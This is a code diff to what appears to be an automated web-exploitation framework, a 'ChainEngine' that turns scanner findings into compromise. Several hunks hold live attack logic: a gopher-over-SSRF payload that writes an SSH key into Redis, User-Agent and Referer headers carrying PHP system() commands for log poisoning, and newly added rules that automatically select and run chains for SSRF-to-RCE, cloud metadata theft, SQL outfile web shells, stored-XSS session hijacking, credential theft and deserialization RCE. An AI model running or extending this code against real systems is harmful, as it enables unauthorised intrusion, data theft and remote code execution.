@@ -2,7 +2,7 @@ import base64
 import os
 import re
 import tempfile
-from typing import Dict, Optional
+from typing import Dict, List, Optional
 
 import requests
 
@@ -378,7 +378,7 @@ def _try_ssrf_redis_rce(param: str, sess: requests.Session,
     ) % (len(ssh_pub), requests.utils.quote(ssh_pub, safe=""))
     test_url = base_url.replace(param + "=", param + "=" + redis_payload)
     try:
-        r = sess.get(test_url, timeout=timeout)
+        sess.get(test_url, timeout=timeout)
         result["success"] = True
         result["evidence"].append("ssh_key_injected_via_redis_gopher")
         result["method"] = "gopher_redis_ssh"
@@ -423,7 +423,6 @@ def _try_lfi_auto_webshell(param: str, sess: requests.Session,
                             base_path: str = "/var/www/html") -> Dict:
     result = {"chain": "lfi_auto_webshell", "success": False, "evidence": []}
 
-    php_cmd = '<?php system("id;whoami;uname -a"); ?>'
     poison_headers = {
         "User-Agent": "<?php system('echo SHELL_READY;id;whoami');?>",
         "Referer": "<?php echo 'SHELL_READY';?>",
@@ -882,6 +881,76 @@ class ChainEngine:
             c.get("success") for c in result["chains"].values()
         )
         return result
+
+    # ------------------------------------------------------------------
+    # Rule-based automatic chain composition from findings
+    # ------------------------------------------------------------------
+    AUTO_CHAIN_RULES = [
+        ("ssrf_containing_file", ["ssrf"], ["file://"], "ssrf_to_rce",
+         lambda f: any("file://" in str(e.get("payload", "")) for e in f.get("evidence", []))),
+        ("ssrf_cloud_metadata", ["ssrf"], ["meta", "169.254"], "ssrf_cloud_pwn",
+         lambda f: any("169.254" in str(e) or "metadata" in str(e) for e in f.get("evidence", []))),
+        ("lfi_log_poison_possible", ["lfi"], ["log", "access"], "lfi_to_rce",
+         lambda f: any("log" in str(e).lower() for e in f.get("evidence", []))),
+        ("lfi_php_wrapper", ["lfi"], ["php://"], "lfi_auto_webshell",
+         lambda f: any("php://" in str(e) for e in f.get("evidence", []))),
+        ("sqli_outfile", ["sqli"], ["intoout", "outfile"], "sqli_to_rce",
+         lambda f: any("outfile" in str(e).lower() or "intoout" in str(e).lower() for e in f.get("evidence", []))),
+        ("sqli_union", ["sqli"], ["union", "extract"], "sqli_to_data",
+         lambda f: f.get("type") in ("union", "error_based")),
+        ("xss_stored", ["xss"], ["stored", "saved"], "xss_to_hijack",
+         lambda f: "stored" in str(f.get("type", "")).lower()),
+        ("deser_gadget", ["deser"], ["rO0ABX", "java", "O:10"], "deser_to_rce",
+         lambda f: any("rO0ABX" in str(e) or "O:10" in str(e) for e in f.get("evidence", []))),
+    ]
+
+    def auto_compose(self, findings: Dict[str, Dict]) -> List[Dict]:
+        paths = []
+        for finding_id, finding in findings.items():
+            vtype = finding.get("type", "")
+            for rule_name, types, keywords, chain_name, matcher in self.AUTO_CHAIN_RULES:
+                if vtype not in types:
+                    continue
+                if not matcher(finding):
+                    continue
+                paths.append({
+                    "rule": rule_name,
+                    "chain": chain_name,
+                    "from_vuln": vtype,
+                    "finding_id": finding_id,
+                    "url": finding.get("url"),
+                    "param": finding.get("param"),
+                })
+        return paths
+
+    def execute_auto_chains(self, findings: Dict[str, Dict],
+                            url: str, param: str) -> Dict:
+        composed = self.auto_compose(findings)
+        result = {"composed_chains": composed, "results": {}}
+        for entry in composed:
+            chain_fn = self._chain_map().get(entry["chain"])
+            if chain_fn:
+                try:
+                    result["results"][entry["chain"]] = chain_fn(url, param)
+                except Exception as e:
+                    result["results"][entry["chain"]] = {"error": str(e)}
+        return result
+
+    def _chain_map(self) -> Dict:
+        return {
+            "ssrf_to_rce": self.chain_ssrf_to_rce,
+            "ssrf_cloud_pwn": self.chain_ssrf_cloud_pwn,
+            "lfi_to_rce": self.chain_lfi_to_rce,
+            "lfi_auto_webshell": self.chain_lfi_auto_webshell,
+            "lfi_to_ssh": self.chain_lfi_to_ssh,
+            "sqli_to_rce": self.chain_sqli_to_rce,
+            "sqli_to_data": self.chain_sqli_to_data_dump,
+            "xss_to_hijack": self.chain_xss_to_hijack,
+            "xss_to_cred": self.chain_xss_to_cred_steal,
+            "auth_bypass_to_pwn": self.chain_auth_to_admin,
+            "deser_to_rce": self.chain_deser_to_rce,
+            "debug_abuse": self.chain_debug_abuse,
+        }
 
     def run(self, url: str, param: str, chain: str = "full_chain") -> Dict:
         chain_map = {
